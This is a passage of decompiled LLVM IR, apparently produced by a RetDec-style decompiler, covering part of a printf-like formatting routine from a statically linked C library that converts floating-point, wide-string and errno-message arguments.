  store i32 %v6_8051e98, i32* %eax.global-to-local, align 4
  %v0_8051e9d = load i32, i32* @esp, align 4
  %v1_8051e9d = add i32 %v0_8051e9d, 32
  store i32 %v6_8051e98, i32* @edi, align 4
  %v1_8051ea2 = add i32 %v0_8051e9d, 80
  %v2_8051ea2 = inttoptr i32 %v1_8051ea2 to i32*
  %v3_8051ea2 = load i32, i32* %v2_8051ea2, align 4
  %tmp95 = icmp ult i32 %v3_8051ea2, 6
  br i1 %tmp95, label %dec_label_pc_8051ed0, label %dec_label_pc_8051ea9

dec_label_pc_8051ea9:                             ; preds = %dec_label_pc_8051e81
  %v1_8051ea9 = inttoptr i32 %v6_8051e98 to i8*
  %v2_8051ea9 = load i8, i8* %v1_8051ea9, align 1
  %v11_8051ea9 = icmp eq i8 %v2_8051ea9, 45
  %v1_8051eac = icmp eq i1 %v11_8051ea9, false
  %v1_8051ebb = add i32 %v0_8051e9d, 64
  %v2_8051ebb = inttoptr i32 %v1_8051ebb to i32*
  %v3_8051ebb = load i32, i32* %v2_8051ebb, align 4
  br i1 %v1_8051eac, label %dec_label_pc_8051ebb, label %dec_label_pc_8051eae

dec_label_pc_8051eae:                             ; preds = %dec_label_pc_8051ea9
  %v4_8051eae = or i32 %v3_8051ebb, 2
  store i32 %v4_8051eae, i32* %v2_8051ebb, align 4
  %v0_8051eb3 = load i32, i32* @edi, align 4
  %v1_8051eb3 = add i32 %v0_8051eb3, 1
  store i32 %v1_8051eb3, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8051ed0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051ed0

dec_label_pc_8051ebb:                             ; preds = %dec_label_pc_8051ea9
  store i32 %v3_8051ebb, i32* %eax.global-to-local, align 4
  %v2_8051ebf = and i32 %v3_8051ebb, 2
  %v3_8051ebf = icmp eq i32 %v2_8051ebf, 0
  br i1 %v3_8051ebf, label %dec_label_pc_8051ec7, label %dec_label_pc_8051ec3

dec_label_pc_8051ec3:                             ; preds = %dec_label_pc_8051ebb
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051ed0

dec_label_pc_8051ec7:                             ; preds = %dec_label_pc_8051ebb
  %v2_8051ec7 = urem i32 %v3_8051ebb, 2
  %v3_8051ec7 = icmp eq i32 %v2_8051ec7, 0
  br i1 %v3_8051ec7, label %dec_label_pc_8051ed0, label %dec_label_pc_8051ecb

dec_label_pc_8051ecb:                             ; preds = %dec_label_pc_8051ec7
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_8051ed0

dec_label_pc_8051ed0:                             ; preds = %dec_label_pc_8051ec7, %dec_label_pc_8051e81, %dec_label_pc_8051ec3, %dec_label_pc_8051eae, %dec_label_pc_8051ecb
  %v0_8051f23 = phi i32 [ %v6_8051e98, %dec_label_pc_8051ec7 ], [ %v6_8051e98, %dec_label_pc_8051e81 ], [ %v6_8051e98, %dec_label_pc_8051ec3 ], [ %v1_8051eb3, %dec_label_pc_8051eae ], [ %v6_8051e98, %dec_label_pc_8051ecb ]
  %v0_8051f32 = phi i32 [ %v1_8051e9d, %dec_label_pc_8051ec7 ], [ %v1_8051e9d, %dec_label_pc_8051e81 ], [ %v1_8051e9d, %dec_label_pc_8051ec3 ], [ %v0_8051ed0.pre, %dec_label_pc_8051eae ], [ %v1_8051e9d, %dec_label_pc_8051ecb ]
  %v1_8051ed0 = add i32 %v0_8051f32, 204
  store i32 %v1_8051ed0, i32* %ecx.global-to-local, align 4
  %v1_8051ed7 = add i32 %v0_8051f32, 20
  %v2_8051ed7 = inttoptr i32 %v1_8051ed7 to i32*
  %v3_8051ed7 = load i32, i32* %v2_8051ed7, align 4
  store i32 %v3_8051ed7, i32* %edx.global-to-local, align 4
  %v2_8051edb = sub i32 %v1_8051ed0, %v0_8051f23
  store i32 %v2_8051edb, i32* %ecx.global-to-local, align 4
  %v2_8051edd = icmp slt i32 %v3_8051ed7, 0
  %v1_8051edf = add i32 %v2_8051edb, 127
  store i32 %v1_8051edf, i32* @esi, align 4
  %v1_8051ee2 = icmp eq i1 %v2_8051edd, false
  br i1 %v1_8051ee2, label %dec_label_pc_8051ee9, label %dec_label_pc_8051ee4

dec_label_pc_8051ee4:                             ; preds = %dec_label_pc_8051ed0
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051ee9

dec_label_pc_8051ee9:                             ; preds = %dec_label_pc_8051ed0, %dec_label_pc_8051ee4
  %v0_8051f0f = phi i32 [ %v3_8051ed7, %dec_label_pc_8051ed0 ], [ 1, %dec_label_pc_8051ee4 ]
  %v1_8051ee9 = add i32 %v0_8051f32, 32
  %v2_8051ee9 = inttoptr i32 %v1_8051ee9 to i8*
  %v3_8051ee9 = load i8, i8* %v2_8051ee9, align 1
  %v4_8051ee9 = and i8 %v3_8051ee9, 16
  %v5_8051ee9 = icmp eq i8 %v4_8051ee9, 0
  br i1 %v5_8051ee9, label %dec_label_pc_8051f23, label %dec_label_pc_8051ef0

dec_label_pc_8051ef0:                             ; preds = %dec_label_pc_8051ee9
  %v1_8051ef0 = add i32 %v0_8051f32, 48
  %v2_8051ef0 = inttoptr i32 %v1_8051ef0 to i32*
  %v3_8051ef0 = load i32, i32* %v2_8051ef0, align 4
  store i32 %v3_8051ef0, i32* %eax.global-to-local, align 4
  %tmp96 = icmp ult i32 %v3_8051ef0, 3
  br i1 %tmp96, label %dec_label_pc_8051f0a.thread, label %dec_label_pc_8051efe

dec_label_pc_8051f0a.thread:                      ; preds = %dec_label_pc_8051ef0
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_8051f23

dec_label_pc_8051efe:                             ; preds = %dec_label_pc_8051ef0
  %v9_8051efe = icmp eq i32 %v3_8051ef0, 3
  %v1_8051f01 = icmp eq i1 %v9_8051efe, false
  br i1 %v1_8051f01, label %dec_label_pc_8051f0a, label %dec_label_pc_8051f03

dec_label_pc_8051f03:                             ; preds = %dec_label_pc_8051efe
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8051f23

dec_label_pc_8051f0a:                             ; preds = %dec_label_pc_8051efe
  %v9_8051f0a = icmp eq i32 %v3_8051ef0, 4
  %v1_8051f0d = icmp eq i1 %v9_8051f0a, false
  br i1 %v1_8051f0d, label %dec_label_pc_8051f23, label %dec_label_pc_8051f0f

dec_label_pc_8051f0f:                             ; preds = %dec_label_pc_8051f0a
  %tmp97 = icmp ugt i32 %v0_8051f0f, %v1_8051edf
  br i1 %tmp97, label %dec_label_pc_8051f23, label %dec_label_pc_8051f13

dec_label_pc_8051f13:                             ; preds = %dec_label_pc_8051f0f
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8051f18 = inttoptr i32 %v0_8051f23 to i8*
  %v2_8051f18 = load i8, i8* %v1_8051f18, align 1
  %v8_8051f18 = icmp eq i8 %v2_8051f18, 48
  br i1 %v8_8051f18, label %dec_label_pc_8051f23, label %dec_label_pc_8051f1d

dec_label_pc_8051f1d:                             ; preds = %dec_label_pc_8051f13
  %v1_8051f1d = add i32 %v2_8051edb, 128
  store i32 %v1_8051f1d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051f23

dec_label_pc_8051f23:                             ; preds = %dec_label_pc_8051f0a.thread, %dec_label_pc_8051f0f, %dec_label_pc_8051f13, %dec_label_pc_8051f0a, %dec_label_pc_8051ee9, %dec_label_pc_8051f03, %dec_label_pc_8051f1d
  %v0_8051f5b = phi i32 [ %v0_8051f0f, %dec_label_pc_8051f0f ], [ 1, %dec_label_pc_8051f13 ], [ %v0_8051f0f, %dec_label_pc_8051f0a ], [ %v0_8051f0f, %dec_label_pc_8051ee9 ], [ %v0_8051f0f, %dec_label_pc_8051f03 ], [ %v1_8051f1d, %dec_label_pc_8051f1d ], [ %v0_8051f0f, %dec_label_pc_8051f0a.thread ]
  %v1_8051f23 = inttoptr i32 %v0_8051f23 to i8*
  %v2_8051f23 = load i8, i8* %v1_8051f23, align 1
  %v8_8051f23 = icmp eq i8 %v2_8051f23, 48
  %v1_8051f26 = icmp eq i1 %v8_8051f23, false
  br i1 %v1_8051f26, label %dec_label_pc_8051f53, label %dec_label_pc_8051f28

dec_label_pc_8051f28:                             ; preds = %dec_label_pc_8051f23
  %v0_8051f28 = load i32, i32* @ebp, align 4
  %v7_8051f2b = icmp sgt i32 %v0_8051f28, 5
  br i1 %v7_8051f2b, label %dec_label_pc_8051f2d, label %dec_label_pc_8051f32

dec_label_pc_8051f2d:                             ; preds = %dec_label_pc_8051f28
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8051f32

dec_label_pc_8051f32:                             ; preds = %dec_label_pc_8051f28, %dec_label_pc_8051f2d
  %v1_8051f32 = add i32 %v0_8051f32, 48
  %v2_8051f32 = inttoptr i32 %v1_8051f32 to i32*
  %v3_8051f32 = load i32, i32* %v2_8051f32, align 4
  %v12_8051f32 = icmp eq i32 %v3_8051f32, 1
  %v1_8051f37 = icmp eq i1 %v12_8051f32, false
  br i1 %v1_8051f37, label %dec_label_pc_8051f48, label %dec_label_pc_8051f39

dec_label_pc_8051f39:                             ; preds = %dec_label_pc_8051f32
  store i32 ptrtoint ([6 x i8]* @global_var_805cff8.925 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_80520c4

dec_label_pc_8051f48:                             ; preds = %dec_label_pc_8051f32
  %v1_8051f48 = icmp eq i32 %v0_8051f5b, 0
  %v1_8051f4a = icmp eq i1 %v1_8051f48, false
  br i1 %v1_8051f4a, label %dec_label_pc_8051f53, label %dec_label_pc_8051f4c

dec_label_pc_8051f4c:                             ; preds = %dec_label_pc_8051f48
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80520c4

dec_label_pc_8051f53:                             ; preds = %dec_label_pc_8051f48, %dec_label_pc_8051f23
  %v2_8051f53 = sub i32 %v0_8051f5b, %v1_8051edf
  %v7_8051f53 = icmp ult i32 %v0_8051f5b, %v1_8051edf
  %v12_8051f53 = icmp eq i32 %v2_8051f53, 0
  %v2_8051f55 = or i1 %v7_8051f53, %v12_8051f53
  br i1 %v2_8051f55, label %dec_label_pc_80520c4, label %dec_label_pc_8051f5b

dec_label_pc_8051f5b:                             ; preds = %dec_label_pc_8051f53
  store i32 %v2_8051f53, i32* @ebx, align 4
  br label %dec_label_pc_80520de

dec_label_pc_8051f64:                             ; preds = %dec_label_pc_8051dfa
  %tmp98 = icmp ult i32 %v3_8051dcc, 16
  br i1 %tmp98, label %dec_label_pc_8051f69, label %dec_label_pc_8051fae

dec_label_pc_8051f69:                             ; preds = %dec_label_pc_8051f64
  %v1_8051f69 = add i32 %v0_8051dcc.lcssa, 33
  %v2_8051f69 = inttoptr i32 %v1_8051f69 to i8*
  %v3_8051f69 = load i8, i8* %v2_8051f69, align 1
  %v4_8051f69 = and i8 %v3_8051f69, 8
  %v5_8051f69 = icmp eq i8 %v4_8051f69, 0
  %v1_8051f6e = add i32 %v0_8051dcc.lcssa, 344
  %v2_8051f6e = inttoptr i32 %v1_8051f6e to i32*
  %v3_8051f6e = load i32, i32* %v2_8051f6e, align 4
  store i32 %v3_8051f6e, i32* %edx.global-to-local, align 4
  br i1 %v5_8051f69, label %dec_label_pc_8051f7b, label %dec_label_pc_8051f77

dec_label_pc_8051f77:                             ; preds = %dec_label_pc_8051f69
  %v1_8051f77 = inttoptr i32 %v3_8051f6e to x86_fp80*
  %v2_8051f77 = load x86_fp80, x86_fp80* %v1_8051f77, align 4
  br label %dec_label_pc_8051f7d

dec_label_pc_8051f7b:                             ; preds = %dec_label_pc_8051f69
  %v1_8051f7b = inttoptr i32 %v3_8051f6e to double*
  %v2_8051f7b = load double, double* %v1_8051f7b, align 4
  %v3_8051f7b = fpext double %v2_8051f7b to x86_fp80
  br label %dec_label_pc_8051f7d

dec_label_pc_8051f7d:                             ; preds = %dec_label_pc_8051f77, %dec_label_pc_8051f7b
  %storemerge4 = phi x86_fp80 [ %v2_8051f77, %dec_label_pc_8051f77 ], [ %v3_8051f7b, %dec_label_pc_8051f7b ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_8051f7d = load i32, i32* @esi, align 4
  %v2_8051f7d = add i32 %v0_8051dcc.lcssa, -4
  %v3_8051f7d = inttoptr i32 %v2_8051f7d to i32*
  store i32 %v0_8051f7d, i32* %v3_8051f7d, align 4
  %v0_8051f7e = load i32, i32* @esi, align 4
  %v2_8051f7e = add i32 %v0_8051dcc.lcssa, -8
  %v3_8051f7e = inttoptr i32 %v2_8051f7e to i32*
  store i32 %v0_8051f7e, i32* %v3_8051f7e, align 4
  %v1_8051f7f = add i32 %v0_8051dcc.lcssa, -12
  %v2_8051f7f = inttoptr i32 %v1_8051f7f to i32*
  store i32 134552642, i32* %v2_8051f7f, align 4
  %v1_8051f84 = add i32 %v0_8051dcc.lcssa, 20
  store i32 %v1_8051f84, i32* %eax.global-to-local, align 4
  %v2_8051f88 = add i32 %v0_8051dcc.lcssa, -16
  %v3_8051f88 = inttoptr i32 %v2_8051f88 to i32*
  store i32 %v1_8051f84, i32* %v3_8051f88, align 4
  %v1_8051f89 = add i32 %v0_8051dcc.lcssa, -28
  %v1_8051f8c = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8051f8c = inttoptr i32 %v1_8051f89 to x86_fp80*
  store x86_fp80 %v1_8051f8c, x86_fp80* %v3_8051f8c, align 4
  %v1_8051f8f = add i32 %v0_8051dcc.lcssa, 368
  %v2_8051f8f = inttoptr i32 %v1_8051f8f to i32*
  %v3_8051f8f = load i32, i32* %v2_8051f8f, align 4
  %v5_8051f8f = add i32 %v0_8051dcc.lcssa, -32
  %v6_8051f8f = inttoptr i32 %v5_8051f8f to i32*
  store i32 %v3_8051f8f, i32* %v6_8051f8f, align 4
  %v0_8051f96 = call i32 @_fpmaxtostr()
  store i32 %v0_8051f96, i32* %eax.global-to-local, align 4
  %v0_8051f9b = load i32, i32* @esp, align 4
  %v1_8051f9b = add i32 %v0_8051f9b, 32
  %v2_8051f9e = icmp slt i32 %v0_8051f96, 0
  br i1 %v2_8051f9e, label %dec_label_pc_805223f, label %dec_label_pc_8051fa6

dec_label_pc_8051fa6:                             ; preds = %dec_label_pc_8051f7d
  %v1_8051fa6 = inttoptr i32 %v1_8051f9b to i32*
  %v2_8051fa6 = load i32, i32* %v1_8051fa6, align 4
  %v4_8051fa6 = add i32 %v2_8051fa6, %v0_8051f96
  store i32 %v4_8051fa6, i32* %v1_8051fa6, align 4
  %v0_805222c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805222c

dec_label_pc_8051fae:                             ; preds = %dec_label_pc_8051f64
  %tmp99 = or i32 %v3_8051dcc, 1
  %tmp100 = icmp eq i32 %tmp99, 17
  br i1 %tmp100, label %dec_label_pc_8051fb7, label %dec_label_pc_805204a

dec_label_pc_8051fb7:                             ; preds = %dec_label_pc_8051fae
  %v9_8051fae = icmp eq i32 %v3_8051dcc, 17
  %v1_8051fb7 = add i32 %v0_8051dcc.lcssa, 332
  %v2_8051fb7 = inttoptr i32 %v1_8051fb7 to i32*
  store i32 0, i32* %v2_8051fb7, align 4
  %v0_8051fc2 = load i32, i32* @esp, align 4
  %v1_8051fc2 = add i32 %v0_8051fc2, 344
  %v2_8051fc2 = inttoptr i32 %v1_8051fc2 to i32*
  %v3_8051fc2 = load i32, i32* %v2_8051fc2, align 4
  store i32 %v3_8051fc2, i32* %edx.global-to-local, align 4
  %v1_8051fc9 = icmp eq i1 %v9_8051fae, false
  br i1 %v1_8051fc9, label %dec_label_pc_8052015, label %dec_label_pc_8051fcb

dec_label_pc_8051fcb:                             ; preds = %dec_label_pc_8051fb7
  %v1_8051fcb = inttoptr i32 %v3_8051fc2 to i32*
  %v2_8051fcb = load i32, i32* %v1_8051fcb, align 4
  store i32 %v2_8051fcb, i32* %eax.global-to-local, align 4
  %v2_8051fcd = add i32 %v0_8051fc2, 340
  %v3_8051fcd = inttoptr i32 %v2_8051fcd to i32*
  store i32 %v2_8051fcb, i32* %v3_8051fcd, align 4
  %v0_8051fd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051fd4 = icmp eq i32 %v0_8051fd4, 0
  br i1 %v1_8051fd4, label %dec_label_pc_80520c8, label %dec_label_pc_8051fdc

dec_label_pc_8051fdc:                             ; preds = %dec_label_pc_8051fcb
  %v0_8051fdc = load i32, i32* @esp, align 4
  %v1_8051fdc = add i32 %v0_8051fdc, 20
  %v2_8051fdc = inttoptr i32 %v1_8051fdc to i32*
  %v3_8051fdc = load i32, i32* %v2_8051fdc, align 4
  store i32 %v3_8051fdc, i32* %eax.global-to-local, align 4
  %v2_8051fe3 = icmp slt i32 %v3_8051fdc, 0
  br i1 %v2_8051fe3, label %dec_label_pc_8051fe9, label %dec_label_pc_8051fe7

dec_label_pc_8051fe7:                             ; preds = %dec_label_pc_8051fdc
  br label %dec_label_pc_8051fe9

dec_label_pc_8051fe9:                             ; preds = %dec_label_pc_8051fdc, %dec_label_pc_8051fe7
  %storemerge104 = phi i32 [ %v3_8051fdc, %dec_label_pc_8051fe7 ], [ -1, %dec_label_pc_8051fdc ]
  store i32 %storemerge104, i32* %ecx.global-to-local, align 4
  %v1_8051fe9 = add i32 %v0_8051fdc, 340
  store i32 %v1_8051fe9, i32* %edx.global-to-local, align 4
  %v1_8051ff0 = add i32 %v0_8051fdc, 332
  store i32 %v1_8051ff0, i32* %eax.global-to-local, align 4
  %v2_8051ff7 = add i32 %v0_8051fdc, -4
  %v3_8051ff7 = inttoptr i32 %v2_8051ff7 to i32*
  store i32 %v1_8051ff0, i32* %v3_8051ff7, align 4
  %v0_8051ff8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051ff8 = add i32 %v0_8051fdc, -8
  %v3_8051ff8 = inttoptr i32 %v2_8051ff8 to i32*
  store i32 %v0_8051ff8, i32* %v3_8051ff8, align 4
  %v0_8051ff9 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051ff9 = add i32 %v0_8051fdc, -12
  %v3_8051ff9 = inttoptr i32 %v2_8051ff9 to i32*
  store i32 %v0_8051ff9, i32* %v3_8051ff9, align 4
  %v0_8051ffa = load i32, i32* %edx.global-to-local, align 4
  %v2_8051ffa = add i32 %v0_8051fdc, -16
  %v3_8051ffa = inttoptr i32 %v2_8051ffa to i32*
  store i32 %v0_8051ffa, i32* %v3_8051ffa, align 4
  %v0_8051ffb = call i32 @__GI_wcsrtombs()
  store i32 %v0_8051ffb, i32* %eax.global-to-local, align 4
  %v0_8052000 = load i32, i32* @esp, align 4
  %v1_8052000 = add i32 %v0_8052000, 16
  store i32 %v0_8051ffb, i32* @esi, align 4
  %v10_8052005 = icmp eq i32 %v0_8051ffb, -1
  br i1 %v10_8052005, label %dec_label_pc_805223f, label %dec_label_pc_805200e

dec_label_pc_805200e:                             ; preds = %dec_label_pc_8051fe9
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80520d2

dec_label_pc_8052015:                             ; preds = %dec_label_pc_8051fb7
  %v0_8052015 = load i32, i32* @ebx, align 4
  %v2_8052015 = add i32 %v0_8051fc2, -4
  %v3_8052015 = inttoptr i32 %v2_8052015 to i32*
  store i32 %v0_8052015, i32* %v3_8052015, align 4
  %v1_8052016 = add i32 %v0_8051fc2, 332
  store i32 %v1_8052016, i32* %eax.global-to-local, align 4
  %v2_805201d = add i32 %v0_8051fc2, -8
  %v3_805201d = inttoptr i32 %v2_805201d to i32*
  store i32 %v1_8052016, i32* %v3_805201d, align 4
  %v0_805201e = load i32, i32* %edx.global-to-local, align 4
  %v1_805201e = inttoptr i32 %v0_805201e to i32*
  %v2_805201e = load i32, i32* %v1_805201e, align 4
  %v4_805201e = add i32 %v0_8051fc2, -12
  %v5_805201e = inttoptr i32 %v4_805201e to i32*
  store i32 %v2_805201e, i32* %v5_805201e, align 4
  %v1_8052020 = add i32 %v0_8051fc2, 204
  store i32 %v1_8052020, i32* @ebx, align 4
  %v2_8052027 = add i32 %v0_8051fc2, -16
  %v3_8052027 = inttoptr i32 %v2_8052027 to i32*
  store i32 %v1_8052020, i32* %v3_8052027, align 4
  %v0_8052028 = call i32 @__GI_wcrtomb()
  store i32 %v0_8052028, i32* %eax.global-to-local, align 4
  %v0_805202d = load i32, i32* @esp, align 4
  %v1_805202d = add i32 %v0_805202d, 16
  store i32 %v0_8052028, i32* @esi, align 4
  %v10_8052032 = icmp eq i32 %v0_8052028, -1
  br i1 %v10_8052032, label %dec_label_pc_805223f, label %dec_label_pc_805203b

dec_label_pc_805203b:                             ; preds = %dec_label_pc_8052015
  %v0_805203b = load i32, i32* @ebx, align 4
  store i32 %v0_805203b, i32* @edi, align 4
  %v2_805203d = add i32 %v0_8052028, 220
  %v3_805203d = add i32 %v2_805203d, %v0_805202d
  %v4_805203d = inttoptr i32 %v3_805203d to i8*
  store i8 0, i8* %v4_805203d, align 1
  br label %dec_label_pc_80520d2

dec_label_pc_805204a:                             ; preds = %dec_label_pc_8051fae
  %tmp101 = icmp ult i32 %v3_8051dcc, 20
  br i1 %tmp101, label %dec_label_pc_805204f, label %dec_label_pc_805209a

dec_label_pc_805204f:                             ; preds = %dec_label_pc_805204a
  %v9_805204a = icmp eq i32 %v3_8051dcc, 19
  %v1_805204f = add i32 %v0_8051dcc.lcssa, 344
  %v2_805204f = inttoptr i32 %v1_805204f to i32*
  %v3_805204f = load i32, i32* %v2_805204f, align 4
  store i32 %v3_805204f, i32* %edx.global-to-local, align 4
  %v1_8052056 = icmp eq i1 %v9_805204a, false
  %v1_805207b = inttoptr i32 %v3_805204f to i32*
  %v2_805207b = load i32, i32* %v1_805207b, align 4
  br i1 %v1_8052056, label %dec_label_pc_805207b, label %dec_label_pc_8052058

dec_label_pc_8052058:                             ; preds = %dec_label_pc_805204f
  store i32 %v2_805207b, i32* @edi, align 4
  %v1_805205a = icmp eq i32 %v2_805207b, 0
  br i1 %v1_805205a, label %dec_label_pc_80520c8, label %dec_label_pc_805205e

dec_label_pc_805205e:                             ; preds = %dec_label_pc_8052058, %dec_label_pc_80520a3
  %v1_805206b = phi i32 [ %v0_8051dcc.lcssa, %dec_label_pc_8052058 ], [ %v1_80520bd, %dec_label_pc_80520a3 ]
  %v1_805205e = add i32 %v1_805206b, 20
  %v2_805205e = inttoptr i32 %v1_805205e to i32*
  %v3_805205e = load i32, i32* %v2_805205e, align 4
  store i32 %v3_805205e, i32* %eax.global-to-local, align 4
  %v2_8052065 = icmp slt i32 %v3_805205e, 0
  br i1 %v2_8052065, label %dec_label_pc_805206b, label %dec_label_pc_8052069

dec_label_pc_8052069:                             ; preds = %dec_label_pc_805205e
  br label %dec_label_pc_805206b

dec_label_pc_805206b:                             ; preds = %dec_label_pc_805205e, %dec_label_pc_8052069
  %storemerge = phi i32 [ %v3_805205e, %dec_label_pc_8052069 ], [ -1, %dec_label_pc_805205e ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_805206b = add i32 %v1_805206b, -4
  %v3_805206b = inttoptr i32 %v2_805206b to i32*
  store i32 %v3_8051dcc, i32* %v3_805206b, align 4
  %v2_805206c = add i32 %v1_805206b, -8
  %v3_805206c = inttoptr i32 %v2_805206c to i32*
  store i32 %v3_8051dcc, i32* %v3_805206c, align 4
  %v0_805206d = load i32, i32* %edx.global-to-local, align 4
  %v2_805206d = add i32 %v1_805206b, -12
  %v3_805206d = inttoptr i32 %v2_805206d to i32*
  store i32 %v0_805206d, i32* %v3_805206d, align 4
  %v0_805206e = load i32, i32* @edi, align 4
  %v2_805206e = add i32 %v1_805206b, -16
  %v3_805206e = inttoptr i32 %v2_805206e to i32*
  store i32 %v0_805206e, i32* %v3_805206e, align 4
  %v0_805206f = call i32 @strnlen()
  store i32 %v0_805206f, i32* %eax.global-to-local, align 4
  store i32 %v0_805206f, i32* @esi, align 4
  br label %dec_label_pc_80520d2

dec_label_pc_805207b:                             ; preds = %dec_label_pc_805204f
  store i32 %v2_805207b, i32* %eax.global-to-local, align 4
  %v1_805207d = add i32 %v0_8051dcc.lcssa, 204
  store i32 %v1_805207d, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_8052089 = trunc i32 %v2_805207b to i8
  %v4_8052089 = inttoptr i32 %v1_805207d to i8*
  store i8 %v1_8052089, i8* %v4_8052089, align 1
  %v0_8052090 = load i32, i32* @esp, align 4
  %v1_8052090 = add i32 %v0_8052090, 205
  %v2_8052090 = inttoptr i32 %v1_8052090 to i8*
  store i8 0, i8* %v2_8052090, align 1
  br label %dec_label_pc_80520d2

dec_label_pc_805209a:                             ; preds = %dec_label_pc_805204a
  %v9_805209a = icmp eq i32 %v3_8051dcc, 20
  %v1_805209d = icmp eq i1 %v9_805209a, false
  br i1 %v1_805209d, label %dec_label_pc_805223f, label %dec_label_pc_80520a3

dec_label_pc_80520a3:                             ; preds = %dec_label_pc_805209a
  %v0_80520a3 = load i32, i32* %stack_var_-364, align 4
  %v1_80520a3 = call i32 @__errno_location(i32 %v0_80520a3)
  store i32 %v1_80520a3, i32* %eax.global-to-local, align 4
  %v0_80520a8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80520a8 = load i32, i32* @esp, align 4
  %v2_80520a8 = add i32 %v1_80520a8, -4
  %v3_80520a8 = inttoptr i32 %v2_80520a8 to i32*
  store i32 %v0_80520a8, i32* %v3_80520a8, align 4
  %v1_80520a9 = add i32 %v1_80520a8, -8
  %v2_80520a9 = inttoptr i32 %v1_80520a9 to i32*
  store i32 128, i32* %v2_80520a9, align 4
  %v1_80520ae = add i32 %v1_80520a8, 204
  store i32 %v1_80520ae, i32* %edx.global-to-local, align 4
  %v2_80520b5 = add i32 %v1_80520a8, -12
  %v3_80520b5 = inttoptr i32 %v2_80520b5 to i32*
  store i32 %v1_80520ae, i32* %v3_80520b5, align 4
  %v1_80520b6 = inttoptr i32 %v1_80520a3 to i32*
  %v2_80520b6 = load i32, i32* %v1_80520b6, align 4
  %v4_80520b6 = add i32 %v1_80520a8, -16
  %v5_80520b6 = inttoptr i32 %v4_80520b6 to i32*
  store i32 %v2_80520b6, i32* %v5_80520b6, align 4
  %v0_80520b8 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_80520b8, i32* %eax.global-to-local, align 4
  %v0_80520bd = load i32, i32* @esp, align 4
  %v1_80520bd = add i32 %v0_80520bd, 16
  store i32 %v0_80520b8, i32* @edi, align 4
  br label %dec_label_pc_805205e

dec_label_pc_80520c4:                             ; preds = %dec_label_pc_8051f53, %dec_label_pc_8051f4c, %dec_label_pc_8051f39
  %v0_80520de36 = phi i32 [ %v1_8051edf, %dec_label_pc_8051f53 ], [ 0, %dec_label_pc_8051f4c ], [ 5, %dec_label_pc_8051f39 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80520de

dec_label_pc_80520c8:                             ; preds = %dec_label_pc_8052058, %dec_label_pc_8051fcb
  store i32 ptrtoint ([7 x i8]* @global_var_805cffe.926 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_80520d2

dec_label_pc_80520d2:                             ; preds = %dec_label_pc_805207b, %dec_label_pc_805206b, %dec_label_pc_805203b, %dec_label_pc_805200e, %dec_label_pc_80520c8
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_80520d9 = load i32, i32* @esp, align 4
  %v1_80520d9 = add i32 %v0_80520d9, 7
  %v2_80520d9 = inttoptr i32 %v1_80520d9 to i8*
  store i8 32, i8* %v2_80520d9, align 1
  %v0_80520de.pre = load i32, i32* @esi, align 4
  %v1_80520de.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80520de

dec_label_pc_80520de:                             ; preds = %dec_label_pc_80520c4, %dec_label_pc_8051f5b, %dec_label_pc_80520d2
  %v1_80520de = phi i32 [ 0, %dec_label_pc_80520c4 ], [ %v2_8051f53, %dec_label_pc_8051f5b ], [ %v1_80520de.pre, %dec_label_pc_80520d2 ]
  %v0_80520de = phi i32 [ %v0_80520de36, %dec_label_pc_80520c4 ], [ %v1_8051edf, %dec_label_pc_8051f5b ], [ %v0_80520de.pre, %dec_label_pc_80520d2 ]
  %v2_80520de = add i32 %v0_80520de, %v1_80520de
  store i32 %v2_80520de, i32* @edx, align 4
  %v0_80520e1 = load i32, i32* @ebp, align 4
  %v9_80520e1 = icmp eq i32 %v0_80520e1, 11
  br i1 %v9_80520e1, label %dec_label_pc_80520f2, label %dec_label_pc_80520e6

dec_label_pc_80520e6:                             ; preds = %dec_label_pc_80520de
  %v1_80520e8 = add i32 %v0_80520e1, -5
  %v6_80520e8 = sub i32 4, %v0_80520e1
  %v7_80520e8 = and i32 %v6_80520e8, %v0_80520e1
  %v8_80520e8 = icmp slt i32 %v7_80520e8, 0
  %v9_80520e8 = icmp eq i32 %v1_80520e8, 0
  %v10_80520e8 = icmp slt i32 %v1_80520e8, 0
  %v3_80520eb = icmp eq i1 %v10_80520e8, %v8_80520e8
  %v4_80520eb = icmp eq i1 %v9_80520e8, false
  %v5_80520eb = and i1 %v4_80520eb, %v3_80520eb
  %v6_80520eb = zext i1 %v5_80520eb to i32
  store i32 %v6_80520eb, i32* %eax.global-to-local, align 4
  %v2_80520ee = add i32 %v2_80520de, 1
  %v3_80520ee = add i32 %v2_80520ee, %v6_80520eb
  store i32 %v3_80520ee, i32* @edx, align 4
  br label %dec_label_pc_80520f2

dec_label_pc_80520f2:                             ; preds = %dec_label_pc_80520de, %dec_label_pc_80520e6
  %v0_80520f2 = load i32, i32* @esp, align 4
  %v1_80520f2 = add i32 %v0_80520f2, 24
  %v2_80520f2 = inttoptr i32 %v1_80520f2 to i32*
  %v3_80520f2 = load i32, i32* %v2_80520f2, align 4
